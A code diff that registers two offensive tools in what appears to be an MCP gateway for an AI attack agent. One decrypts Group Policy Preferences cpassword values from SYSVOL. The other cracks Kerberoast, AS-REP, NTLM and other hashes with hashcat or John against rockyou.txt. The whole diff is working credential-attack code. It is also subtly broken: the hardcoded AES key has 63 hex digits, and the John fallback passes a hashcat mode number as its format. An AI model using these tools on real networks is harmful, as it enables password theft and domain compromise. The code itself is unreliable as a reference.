@@ -1826,6 +1826,233 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=35,
     )
 
+    # ── GPP cPassword Decryption ──────────────────────────────────
+
+    async def gpp_decrypt(cpassword: str) -> ToolResult:
+        """Decrypt a Microsoft GPP (Group Policy Preferences) cpassword value.
+
+        GPP passwords stored in SYSVOL Groups.xml use AES-256-CBC encryption
+        with a well-known static key published by Microsoft (MS-MDQH). This
+        tool performs the full decryption chain: base64 decode, AES-256-CBC
+        decrypt, PKCS7 padding removal, and UTF-16LE decode.
+
+        Use for: AD-13 GPP/cpassword scenarios, any domain where SYSVOL
+        Groups.xml contains encrypted cpassword values. Combine with
+        smb_client to retrieve the XML files from SYSVOL first.
+        """
+        import base64 as _b64
+        import subprocess as _sp
+        import tempfile as _tmp
+        import os as _os
+
+        pw = (cpassword or "").strip()
+        if not pw:
+            return ToolResult(tool_name="gpp_decrypt", success=False,
+                stdout="", stderr="cpassword parameter is required (base64-encoded string from Groups.xml)", exit_code=1, elapsed_ms=0)
+
+        # Microsoft GPP static AES-256-CBC key (publicly documented since 2012)
+        _GPP_KEY = "4e9906e8fcb66cc9faf49310620ffee8f496806cc057990209b09a433b66c1b"
+        _GPP_IV  = "00000000000000000000000000000000"
+
+        t0 = time.perf_counter()
+        try:
+            raw = _b64.b64decode(pw)
+        except Exception:
+            return ToolResult(tool_name="gpp_decrypt", success=False,
+                stdout="", stderr=f"Failed to base64-decode cpassword: '{pw[:80]}...'", exit_code=1, elapsed_ms=0)
+
+        # Write raw encrypted bytes to temp file, decrypt with openssl
+        enc_path = ""
+        try:
+            with _tmp.NamedTemporaryFile(mode="wb", suffix=".enc", delete=False) as _ef:
+                _ef.write(raw)
+                enc_path = _ef.name
+
+            dec = _sp.run(
+                ["openssl", "enc", "-aes-256-cbc", "-d",
+                 "-K", _GPP_KEY, "-iv", _GPP_IV, "-nopad",
+                 "-in", enc_path],
+                capture_output=True, timeout=15,
+            )
+            _os.unlink(enc_path)
+
+            if dec.returncode != 0:
+                return ToolResult(tool_name="gpp_decrypt", success=False,
+                    stdout="", stderr=f"OpenSSL decryption failed: {dec.stderr.decode()[:500]}", exit_code=dec.returncode,
+                    elapsed_ms=int((time.perf_counter() - t0) * 1000))
+
+            plain = dec.stdout
+
+            # Strip PKCS7 padding (last byte = number of padding bytes)
+            if plain:
+                pad_len = plain[-1]
+                if 0 < pad_len <= 16:
+                    plain = plain[:-pad_len]
+
+            # Decode as UTF-16LE, strip null bytes
+            try:
+                text = plain.decode("utf-16-le").rstrip("\x00")
+            except Exception:
+                text = plain.decode("latin-1").rstrip("\x00")
+
+            elapsed = int((time.perf_counter() - t0) * 1000)
+            return ToolResult(tool_name="gpp_decrypt", success=True,
+                stdout=text.strip(), stderr="", exit_code=0, elapsed_ms=elapsed)
+
+        except FileNotFoundError:
+            return ToolResult(tool_name="gpp_decrypt", success=False,
+                stdout="", stderr="openssl not installed — required for GPP decryption", exit_code=127,
+                elapsed_ms=int((time.perf_counter() - t0) * 1000))
+        except Exception as exc:
+            return ToolResult(tool_name="gpp_decrypt", success=False,
+                stdout="", stderr=f"GPP decryption error: {exc}", exit_code=1,
+                elapsed_ms=int((time.perf_counter() - t0) * 1000))
+        finally:
+            try:
+                if _os.path.exists(enc_path):
+                    _os.unlink(enc_path)
+            except Exception:
+                pass
+
+    gateway.register(
+        name="gpp_decrypt",
+        func=gpp_decrypt,
+        description="Decrypt a Microsoft GPP (Group Policy Preferences) cpassword value from SYSVOL Groups.xml. Decrypts AES-256-CBC encrypted passwords using the publicly documented Microsoft GPP key. Use after retrieving Groups.xml via smb_client from \\\\DOMAIN\\SYSVOL. Input is the base64-encoded cpassword string from the XML.",
+        parameters={
+            "cpassword": {"type": "string", "description": "Base64-encoded cpassword value from Groups.xml (e.g. from <Properties cpassword='...'>)"},
+        },
+    )
+
+    # ── Hash Cracking ─────────────────────────────────────────────
+
+    async def hash_crack(
+        hash_string: str, hash_type: str = "", timeout: int = 120,
+    ) -> ToolResult:
+        """Attempt to crack a password hash offline using hashcat or john.
+
+        Auto-detects common hash formats from their prefix. Wraps hashcat
+        and john-the-ripper with graceful fallback. This is a general
+        capability — the tool does not know about any specific target or
+        scenario.
+        """
+        import tempfile as _tmp
+        import subprocess as _sp
+        import os as _os
+
+        hs = (hash_string or "").strip()
+        if not hs:
+            return ToolResult(tool_name="hash_crack", success=False,
+                stdout="", stderr="hash_string is required", exit_code=1, elapsed_ms=0)
+
+        # ── Auto-detect hash type ──────────────────────────────────
+        ht = (hash_type or "").strip()
+        if not ht:
+            if "$krb5tgs$23$" in hs:       ht = "13100"    # Kerberoast
+            elif "$krb5asrep$23$" in hs:    ht = "18200"    # AS-REP roast
+            elif hs.startswith("$2a$") or hs.startswith("$2b$") or hs.startswith("$2y$"):
+                ht = "3200"                                 # bcrypt
+            elif hs.startswith("$6$"):      ht = "1800"     # SHA-512 crypt
+            elif hs.startswith("$1$"):      ht = "500"      # MD5 crypt
+            elif hs.startswith("$5$"):      ht = "7400"     # SHA-256 crypt
+            elif len(hs) == 32 and all(c in "0123456789abcdefABCDEF" for c in hs):
+                ht = "1000"                                 # NTLM
+            else:
+                return ToolResult(tool_name="hash_crack", success=False,
+                    stdout="", stderr=f"Could not auto-detect hash type from prefix. Please specify hash_type manually (hashcat mode number: 13100=Kerberoast, 18200=AS-REP, 1000=NTLM, 3200=bcrypt, 1800=SHA-512). Hash prefix: {hs[:60]}...", exit_code=1, elapsed_ms=0)
+
+        timeout_s = max(10, min(600, int(timeout)))
+        words = "/usr/share/wordlists/rockyou.txt"
+
+        t0 = time.perf_counter()
+        tmp_path = ""
+
+        def _cleanup():
+            try:
+                if tmp_path and _os.path.exists(tmp_path):
+                    _os.unlink(tmp_path)
+            except Exception:
+                pass
+
+        try:
+            # Write hash to temp file
+            with _tmp.NamedTemporaryFile(mode="w", suffix=".hash", delete=False) as _hf:
+                _hf.write(hs + "\n")
+                tmp_path = _hf.name
+
+            # Try hashcat first
+            try_hashcat = _sp.run(
+                ["hashcat", "-m", ht, tmp_path, words, "--force", "--show", "-O"],
+                capture_output=True, timeout=min(30, timeout_s), text=True,
+            )
+            if try_hashcat.returncode == 0 and try_hashcat.stdout.strip():
+                out = try_hashcat.stdout.strip()
+                if ":" in out and not out.startswith("hashcat"):
+                    _cleanup()
+                    elapsed = int((time.perf_counter() - t0) * 1000)
+                    return ToolResult(tool_name="hash_crack", success=True,
+                        stdout=out, stderr="", exit_code=0, elapsed_ms=elapsed)
+
+            # Try longer hashcat run with optimized kernel
+            try_hashcat2 = _sp.run(
+                ["hashcat", "-m", ht, tmp_path, words, "--force", "-O"],
+                capture_output=True, timeout=min(timeout_s, 120), text=True,
+            )
+            if try_hashcat2.returncode == 0:
+                # Rerun with --show to get cracked result
+                show = _sp.run(
+                    ["hashcat", "-m", ht, tmp_path, "--force", "--show"],
+                    capture_output=True, timeout=15, text=True,
+                )
+                if show.returncode == 0 and ":" in show.stdout.strip():
+                    out = show.stdout.strip()
+                    if not out.startswith("hashcat"):
+                        _cleanup()
+                        elapsed = int((time.perf_counter() - t0) * 1000)
+                        return ToolResult(tool_name="hash_crack", success=True,
+                            stdout=out, stderr="", exit_code=0, elapsed_ms=elapsed)
+
+        except FileNotFoundError:
+            pass  # hashcat not installed, try john below
+        except Exception:
+            pass
+
+        # Fall back to john-the-ripper
+        try:
+            try_john = _sp.run(
+                ["john", f"--wordlist={words}", tmp_path, f"--format={ht}"],
+                capture_output=True, timeout=min(timeout_s, 60), text=True,
+            )
+            if try_john.returncode == 0:
+                show_j = _sp.run(
+                    ["john", "--show", tmp_path],
+                    capture_output=True, timeout=15, text=True,
+                )
+                if show_j.returncode == 0 and ":" in show_j.stdout.strip():
+                    _cleanup()
+                    elapsed = int((time.perf_counter() - t0) * 1000)
+                    return ToolResult(tool_name="hash_crack", success=True,
+                        stdout=show_j.stdout.strip(), stderr="", exit_code=0, elapsed_ms=elapsed)
+        except FileNotFoundError:
+            pass
+        except Exception:
+            pass
+
+        _cleanup()
+        elapsed = int((time.perf_counter() - t0) * 1000)
+        return ToolResult(tool_name="hash_crack", success=False,
+            stdout="", stderr=f"Hash not cracked with common wordlist (tried rockyou.txt, auto-detected mode={ht}). Try a more specific wordlist or install hashcat/john if absent.", exit_code=1, elapsed_ms=elapsed)
+
+    gateway.register(
+        name="hash_crack",
+        func=hash_crack,
+        description="Attempt to crack a password hash offline using hashcat or john-the-ripper. Auto-detects hash type from prefix ($krb5tgs$=Kerberoast mode 13100, $krb5asrep$=AS-REP mode 18200, 32-char hex=NTLM mode 1000, $2a$/$2b$=bcrypt mode 3200, $6$=SHA-512 mode 1800). Uses rockyou.txt wordlist by default. Specify hash_type manually if auto-detection fails. This is a general hash-cracking capability — it works against any compatible hash, not just Kerberos.",
+        parameters={
+            "hash_string": {"type": "string", "description": "Complete hash string (e.g. $krb5tgs$23$*... for Kerberoast, $krb5asrep$23$*... for AS-REP, or 32-char hex for NTLM)"},
+            "hash_type": {"type": "string", "description": "Optional hashcat mode number. Auto-detected from prefix if omitted. Common modes: 13100=Kerberoast, 18200=AS-REP, 1000=NTLM, 3200=bcrypt, 1800=SHA-512"},
+            "timeout": {"type": "integer", "description": "Max cracking time in seconds (default 120, max 600)"},
+        },
+    )
+
     return gateway
 
 
